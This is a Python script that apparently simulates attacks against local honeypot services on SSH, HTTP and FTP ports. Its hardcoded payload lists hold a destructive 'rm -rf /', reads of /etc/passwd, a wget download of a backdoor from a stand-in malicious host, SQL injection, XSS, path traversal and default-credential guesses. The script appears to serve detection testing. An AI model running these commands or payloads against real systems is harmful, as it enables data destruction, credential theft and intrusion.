import socket
import time
import random
import threading

def simulate_ssh_attack(host='localhost', port=2222):
    """Simulate SSH brute force and command injection attempts"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Simulate SSH version exchange
        s.send(b'SSH-2.0-OpenSSH_7.2p2\r\n')
        time.sleep(0.5)
        
        # Simulate various attack patterns
        attacks = [
            b'root:password123\r\n',
            b'admin:admin\r\n',
            b'user:password\r\n',
            b'rm -rf /\r\n',
            b'cat /etc/passwd\r\n',
            b'wget http://malicious.com/backdoor.sh\r\n'
        ]
        
        for attack in attacks:
            s.send(attack)
            time.sleep(0.5)
            
        s.close()
    except Exception as e:
        print(f"SSH attack simulation failed: {e}")

def simulate_http_attack(host='localhost', port=8080):
    """Simulate HTTP injection and XSS attacks"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Simulate various HTTP attacks
        attacks = [
            b'GET /?id=1;DROP TABLE users HTTP/1.1\r\nHost: localhost\r\n\r\n',
            b'GET /?q=<script>alert("xss")</script> HTTP/1.1\r\nHost: localhost\r\n\r\n',
            b'GET /wp-login.php HTTP/1.1\r\nHost: localhost\r\n\r\n',
            b'POST /login.php HTTP/1.1\r\nHost: localhost\r\nContent-Length: 50\r\n\r\nusername=admin&password=password123',
            b'GET /../../../etc/passwd HTTP/1.1\r\nHost: localhost\r\n\r\n'
        ]
        
        for attack in attacks:
            s.send(attack)
            time.sleep(0.5)
            response = s.recv(1024)
            print(f"HTTP Response: {response.decode('utf-8', errors='ignore')}")
            
        s.close()
    except Exception as e:
        print(f"HTTP attack simulation failed: {e}")

def simulate_ftp_attack(host='localhost', port=2121):
    """Simulate FTP brute force and command injection"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Simulate FTP login attempts
        attacks = [
            b'USER anonymous\r\nPASS anonymous@example.com\r\n',
            b'USER admin\r\nPASS password123\r\n',
            b'USER root\r\nPASS toor\r\n',
            b'USER test\r\nPASS test\r\n',
            b'USER admin\r\nPASS \' OR \'1\'=\'1\r\n'
        ]
        
        for attack in attacks:
            s.send(attack)
            time.sleep(0.5)
            response = s.recv(1024)
            print(f"FTP Response: {response.decode('utf-8', errors='ignore')}")
            
        s.close()
    except Exception as e:
        print(f"FTP attack simulation failed: {e}")

def run_simulations():
    """Run all attack simulations concurrently"""
    threads = []
    
    # Create threads for each type of attack
    threads.append(threading.Thread(target=simulate_ssh_attack))
    threads.append(threading.Thread(target=simulate_http_attack))
    threads.append(threading.Thread(target=simulate_ftp_attack))
    
    # Start all threads
    for thread in threads:
        thread.start()
        time.sleep(0.5)  # Stagger the start times
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print("Starting attack simulations...")
    run_simulations()
    print("Attack simulations completed!") 